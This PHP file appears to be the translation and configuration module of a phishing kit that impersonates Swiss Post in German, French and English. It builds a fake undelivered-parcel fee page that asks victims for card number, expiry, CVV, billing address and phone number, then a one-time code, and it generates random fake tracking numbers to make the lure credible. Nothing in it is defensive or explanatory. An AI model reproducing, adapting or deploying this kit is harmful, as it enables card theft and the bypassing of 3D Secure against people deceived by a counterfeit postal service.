<?php


if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// ── LANGUAGE DETECTION ──
function detectLanguage() {
    // 1. Check URL parameter
    if (isset($_GET['lang']) && in_array($_GET['lang'], ['de', 'fr', 'en'])) {
        $_SESSION['lang'] = $_GET['lang'];
        return $_GET['lang'];
    }

    // 2. Check session
    if (isset($_SESSION['lang']) && in_array($_SESSION['lang'], ['de', 'fr', 'en'])) {
        return $_SESSION['lang'];
    }

    // 3. Check browser language
    $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'de', 0, 2);

    // Map browser languages to supported languages
    $langMap = [
        'de' => 'de',
        'fr' => 'fr',
        'en' => 'en',
        'it' => 'de', // Italian users get German as fallback
    ];

    $lang = $langMap[$browserLang] ?? 'de';
    $_SESSION['lang'] = $lang;
    return $lang;
}

// Get current language
$currentLang = detectLanguage();

// ── TRANSLATIONS ──
$translations = [
    'de' => [
        // Page titles
        'site_title' => 'Die Schweizerische Post',
        'page_payment' => 'Zahlung - Die Post',
        'page_verification' => 'Bestätigung - Die Post',

        // Navigation
        'nav_send_letters' => 'Briefe versenden',
        'nav_send_packages' => 'Pakete versenden',
        'nav_receive' => 'Post empfangen',
        'nav_more' => 'Weitere Angebote',
        'nav_business' => 'Geschäftslösungen',
        'nav_locations' => 'Standorte',
        'nav_help' => 'Hilfe und Kontakt',
        'nav_my_post' => 'Meine Post',

        // Tabs
        'tab_private' => 'Privatkunden',
        'tab_business' => 'Geschäftskunden',

        // Hero section
        'hero_title' => 'Ihre Sendung konnte nicht zugestellt werden',
        'hero_subtitle' => 'Ihre Sendung wird aufgrund ausstehender Liefergebühren zurückgehalten. Bitte bezahlen Sie die fehlenden Gebühren, um die Zustellung fortzusetzen.',
        'hero_cta' => 'Sendung prüfen',

        // Tracking section
        'track_title' => 'Sendung verfolgen',
        'track_placeholder' => 'Sendungsnummer eingeben',

        // Quick links
        'ql_shop' => 'Shop',
        'ql_prices' => 'Preise',
        'ql_labels' => 'Paketetiketten',
        'ql_pickup' => 'Abholung',
        'ql_stamps' => 'Briefmarken',
        'ql_move' => 'Umzug melden',

        // Modal
        'modal_title' => 'Lieferung wartet auf Zahlung',
        'modal_alert_title' => 'Grund des Fehlers',
        'modal_alert_text' => 'Einige Gebühren fehlen und wurden noch nicht bezahlt. Die Lieferung wird sofort nach der Zahlung freigegeben.',
        'modal_tracking' => 'Sendungsnummer',
        'modal_status' => 'Status',
        'modal_status_pending' => 'Zahlung ausstehend',
        'modal_fees' => 'Gebühren',
        'modal_total' => 'Zu zahlender Betrag',
        'modal_total_sub' => 'Inkl. aller Gebühren',
        'modal_pay_btn' => 'Zur Zahlung',
        'modal_wait' => 'Bitte warten',
        'modal_secure' => 'Sichere Zahlungsverbindung',

        // Payment page
        'pay_secure_badge' => 'Sichere Zahlungsverbindung',
        'pay_title' => 'Liefergebühren bezahlen',
        'pay_tracking' => 'Sendung',
        'pay_delivery_fee' => 'Liefergebühr',
        'pay_processing_fee' => 'Bearbeitungsgebühr',
        'pay_total' => 'Gesamt',
        'pay_card_details' => 'Kartendaten',
        'pay_cardholder' => 'Karteninhaber',
        'pay_cardholder_placeholder' => 'Vorname Nachname',
        'pay_card_number' => 'Kartennummer',
        'pay_expiry' => 'Gültig bis',
        'pay_cvv' => 'Sicherheitscode (CVV)',
        'pay_billing' => 'Rechnungsadresse',
        'pay_address' => 'Strasse',
        'pay_address_placeholder' => 'Musterstrasse 123',
        'pay_city' => 'Stadt',
        'pay_zip' => 'PLZ',
        'pay_phone' => 'Telefonnummer',
        'pay_submit' => 'Zahlen',
        'pay_continue' => 'Weiter zur Zahlung',
        'pay_ssl' => 'SSL-geschützt',
        'pay_realtime' => 'Echtzeit-Bestätigung',
        'pay_3ds' => '3D Secure',
        'pay_back' => 'Zurück',
        'pay_privacy' => 'Mit Klick auf "Zahlen" akzeptieren Sie unsere',
        'pay_privacy_link' => 'Datenschutzerklärung',

        // Errors
        'err_name' => 'Bitte Karteninhaber eingeben',
        'err_card' => 'Bitte gültige Kartennummer eingeben',
        'err_expiry' => 'Bitte Gültigkeitsdatum eingeben',
        'err_cvv' => 'Bitte Sicherheitscode eingeben',
        'err_address' => 'Bitte Strasse eingeben',
        'err_city' => 'Bitte Stadt eingeben',
        'err_zip' => 'Bitte PLZ eingeben',
        'err_phone' => 'Bitte Telefonnummer eingeben',
        'card_valid' => 'Kartennummer gültig',

        // OTP page
        'otp_title' => 'Zahlung bestätigen',
        'otp_info_title' => 'Bestätigungscode gesendet',
        'otp_info_text' => 'Wir haben einen Bestätigungscode an Ihr Telefon gesendet. Geben Sie den Code ein, um die Zahlung abzuschliessen.',
        'otp_label' => '6-stelligen Code eingeben',
        'otp_resend_wait' => 'Code erneut senden',
        'otp_resend' => 'Erneut senden',
        'otp_submit' => 'Zahlung bestätigen',
        'otp_error' => 'Ungültiger Code. Bitte erneut versuchen.',
        'otp_no_code' => 'Keinen Code erhalten?',

        // Footer
        'footer_privacy' => 'Datenschutz und Rechtliches',
        'footer_terms' => 'AGB',
        'footer_copyright' => 'Die Schweizerische Post AG',

        // Breadcrumb
        'bread_home' => 'Startseite',
        'bread_tracking' => 'Sendungsverfolgung',
        'bread_billing' => 'Rechnungsadresse',
        'bread_payment' => 'Zahlung',
        'bread_verification' => 'Bestätigung',
    ],

    'fr' => [
        // Page titles
        'site_title' => 'La Poste Suisse',
        'page_payment' => 'Paiement - La Poste',
        'page_verification' => 'Confirmation - La Poste',

        // Navigation
        'nav_send_letters' => 'Envoyer des lettres',
        'nav_send_packages' => 'Envoyer des colis',
        'nav_receive' => 'Recevoir du courrier',
        'nav_more' => 'Autres offres',
        'nav_business' => 'Solutions commerciales',
        'nav_locations' => 'Sites',
        'nav_help' => 'Aide et contact',
        'nav_my_post' => 'Ma Poste',

        // Tabs
        'tab_private' => 'Clients privés',
        'tab_business' => 'Clients commerciaux',

        // Hero section
        'hero_title' => 'Votre envoi n\'a pas pu être livré',
        'hero_subtitle' => 'Votre envoi est retenu en raison de frais de livraison impayés. Veuillez payer les frais manquants pour poursuivre la livraison.',
        'hero_cta' => 'Vérifier l\'envoi',

        // Tracking section
        'track_title' => 'Suivre un envoi',
        'track_placeholder' => 'Entrer le numéro d\'envoi',

        // Quick links
        'ql_shop' => 'Boutique',
        'ql_prices' => 'Prix',
        'ql_labels' => 'Étiquettes colis',
        'ql_pickup' => 'Enlèvement',
        'ql_stamps' => 'Timbres',
        'ql_move' => 'Annoncer déménagement',

        // Modal
        'modal_title' => 'Livraison en attente de paiement',
        'modal_alert_title' => 'Raison de l\'échec',
        'modal_alert_text' => 'Certains frais sont manquants et n\'ont pas encore été payés. La livraison sera libérée immédiatement après le paiement.',
        'modal_tracking' => 'Numéro d\'envoi',
        'modal_status' => 'Statut',
        'modal_status_pending' => 'Paiement en attente',
        'modal_fees' => 'Frais',
        'modal_total' => 'Montant à payer',
        'modal_total_sub' => 'Tous frais inclus',
        'modal_pay_btn' => 'Continuer vers le paiement',
        'modal_wait' => 'Veuillez patienter',
        'modal_secure' => 'Passerelle de paiement sécurisée',

        // Payment page
        'pay_secure_badge' => 'Passerelle de paiement sécurisée',
        'pay_title' => 'Payer les frais de livraison',
        'pay_tracking' => 'Envoi',
        'pay_delivery_fee' => 'Frais de livraison',
        'pay_processing_fee' => 'Frais de traitement',
        'pay_total' => 'Total',
        'pay_card_details' => 'Informations de carte',
        'pay_cardholder' => 'Titulaire de la carte',
        'pay_cardholder_placeholder' => 'Prénom Nom',
        'pay_card_number' => 'Numéro de carte',
        'pay_expiry' => 'Date d\'expiration',
        'pay_cvv' => 'Code de sécurité (CVV)',
        'pay_billing' => 'Adresse de facturation',
        'pay_address' => 'Rue',
        'pay_address_placeholder' => 'Rue Example 123',
        'pay_city' => 'Ville',
        'pay_zip' => 'Code postal',
        'pay_phone' => 'Numéro de téléphone',
        'pay_submit' => 'Payer',
        'pay_continue' => 'Continuer vers le paiement',
        'pay_ssl' => 'Protégé SSL',
        'pay_realtime' => 'Confirmation en temps réel',
        'pay_3ds' => '3D Secure',
        'pay_back' => 'Retour',
        'pay_privacy' => 'En cliquant sur "Payer", vous acceptez notre',
        'pay_privacy_link' => 'politique de confidentialité',

        // Errors
        'err_name' => 'Veuillez entrer le nom du titulaire',
        'err_card' => 'Veuillez entrer un numéro de carte valide',
        'err_expiry' => 'Veuillez entrer la date d\'expiration',
        'err_cvv' => 'Veuillez entrer le code de sécurité',
        'err_address' => 'Veuillez entrer la rue',
        'err_city' => 'Veuillez entrer la ville',
        'err_zip' => 'Veuillez entrer le code postal',
        'err_phone' => 'Veuillez entrer le numéro de téléphone',
        'card_valid' => 'Numéro de carte valide',

        // OTP page
        'otp_title' => 'Confirmer le paiement',
        'otp_info_title' => 'Code de confirmation envoyé',
        'otp_info_text' => 'Nous avons envoyé un code de confirmation sur votre téléphone. Entrez le code pour finaliser le paiement.',
        'otp_label' => 'Entrer le code à 6 chiffres',
        'otp_resend_wait' => 'Renvoyer le code',
        'otp_resend' => 'Renvoyer',
        'otp_submit' => 'Confirmer le paiement',
        'otp_error' => 'Code invalide. Veuillez réessayer.',
        'otp_no_code' => 'Vous n\'avez pas reçu de code?',

        // Footer
        'footer_privacy' => 'Protection des données',
        'footer_terms' => 'CGV',
        'footer_copyright' => 'La Poste Suisse SA',

        // Breadcrumb
        'bread_home' => 'Accueil',
        'bread_tracking' => 'Suivi des envois',
        'bread_billing' => 'Adresse de facturation',
        'bread_payment' => 'Paiement',
        'bread_verification' => 'Confirmation',
    ],

    'en' => [
        // Page titles
        'site_title' => 'Swiss Post',
        'page_payment' => 'Payment - Swiss Post',
        'page_verification' => 'Verification - Swiss Post',

        // Navigation
        'nav_send_letters' => 'Send letters',
        'nav_send_packages' => 'Send parcels',
        'nav_receive' => 'Receive post',
        'nav_more' => 'More services',
        'nav_business' => 'Business solutions',
        'nav_locations' => 'Locations',
        'nav_help' => 'Help and contact',
        'nav_my_post' => 'My Post',

        // Tabs
        'tab_private' => 'Private customers',
        'tab_business' => 'Business customers',

        // Hero section
        'hero_title' => 'Your shipment could not be delivered',
        'hero_subtitle' => 'Your shipment is being held due to outstanding delivery fees. Please pay the missing fees to continue delivery.',
        'hero_cta' => 'Check shipment',

        // Tracking section
        'track_title' => 'Track your shipment',
        'track_placeholder' => 'Enter tracking number',

        // Quick links
        'ql_shop' => 'Shop',
        'ql_prices' => 'Prices',
        'ql_labels' => 'Parcel labels',
        'ql_pickup' => 'Pickup',
        'ql_stamps' => 'Stamps',
        'ql_move' => 'Report move',

        // Modal
        'modal_title' => 'Delivery awaiting payment',
        'modal_alert_title' => 'Reason for failure',
        'modal_alert_text' => 'Some fees are missing and have not been paid yet. The delivery will be released immediately after payment.',
        'modal_tracking' => 'Tracking number',
        'modal_status' => 'Status',
        'modal_status_pending' => 'Payment pending',
        'modal_fees' => 'Fees',
        'modal_total' => 'Amount to pay',
        'modal_total_sub' => 'Including all fees',
        'modal_pay_btn' => 'Continue to payment',
        'modal_wait' => 'Please wait',
        'modal_secure' => 'Secure payment gateway',

        // Payment page
        'pay_secure_badge' => 'Secure payment gateway',
        'pay_title' => 'Pay delivery fees',
        'pay_tracking' => 'Shipment',
        'pay_delivery_fee' => 'Delivery fee',
        'pay_processing_fee' => 'Processing fee',
        'pay_total' => 'Total',
        'pay_card_details' => 'Card details',
        'pay_cardholder' => 'Cardholder name',
        'pay_cardholder_placeholder' => 'First Last',
        'pay_card_number' => 'Card number',
        'pay_expiry' => 'Expiry date',
        'pay_cvv' => 'Security code (CVV)',
        'pay_billing' => 'Billing address',
        'pay_address' => 'Street',
        'pay_address_placeholder' => '123 Example Street',
        'pay_city' => 'City',
        'pay_zip' => 'Postal code',
        'pay_phone' => 'Phone number',
        'pay_submit' => 'Pay',
        'pay_continue' => 'Continue to payment',
        'pay_ssl' => 'SSL protected',
        'pay_realtime' => 'Real-time verification',
        'pay_3ds' => '3D Secure',
        'pay_back' => 'Back',
        'pay_privacy' => 'By clicking "Pay", you accept our',
        'pay_privacy_link' => 'privacy policy',

        // Errors
        'err_name' => 'Please enter cardholder name',
        'err_card' => 'Please enter a valid card number',
        'err_expiry' => 'Please enter expiry date',
        'err_cvv' => 'Please enter security code',
        'err_address' => 'Please enter street address',
        'err_city' => 'Please enter city',
        'err_zip' => 'Please enter postal code',
        'err_phone' => 'Please enter phone number',
        'card_valid' => 'Card number valid',

        // OTP page
        'otp_title' => 'Confirm payment',
        'otp_info_title' => 'Confirmation code sent',
        'otp_info_text' => 'We have sent a confirmation code to your phone. Enter the code to complete the payment.',
        'otp_label' => 'Enter 6-digit code',
        'otp_resend_wait' => 'Resend code',
        'otp_resend' => 'Resend',
        'otp_submit' => 'Confirm payment',
        'otp_error' => 'Invalid code. Please try again.',
        'otp_no_code' => 'Didn\'t receive a code?',

        // Footer
        'footer_privacy' => 'Privacy and legal',
        'footer_terms' => 'Terms',
        'footer_copyright' => 'Swiss Post Ltd',

        // Breadcrumb
        'bread_home' => 'Home',
        'bread_tracking' => 'Shipment tracking',
        'bread_billing' => 'Billing address',
        'bread_payment' => 'Payment',
        'bread_verification' => 'Verification',
    ],
];



// Translation helper function
function t($key) {
    global $translations, $currentLang;
    return $translations[$currentLang][$key] ?? $translations['de'][$key] ?? $key;
}

// Generate tracking number (Swiss Post format: 99.12.345678.12345678)
function generateTrackingNumber($country = 'CH') {
    $part1 = '99';
    $part2 = str_pad(rand(10, 99), 2, '0', STR_PAD_LEFT);
    $part3 = str_pad(rand(100000, 999999), 6, '0', STR_PAD_LEFT);
    $part4 = str_pad(rand(10000000, 99999999), 8, '0', STR_PAD_LEFT);
    return $part1 . '.' . $part2 . '.' . $part3 . '.' . $part4;
}

// Get or set tracking number
if (empty($_SESSION['tracking_number'])) {
    $_SESSION['tracking_number'] = generateTrackingNumber($_SESSION['ip_info']['countryCode'] ?? 'CH');
}
$trackingNumber = $_SESSION['tracking_number'];

// Amount (in CHF)
$amount = '2.99';
$currency = 'CHF';
?>
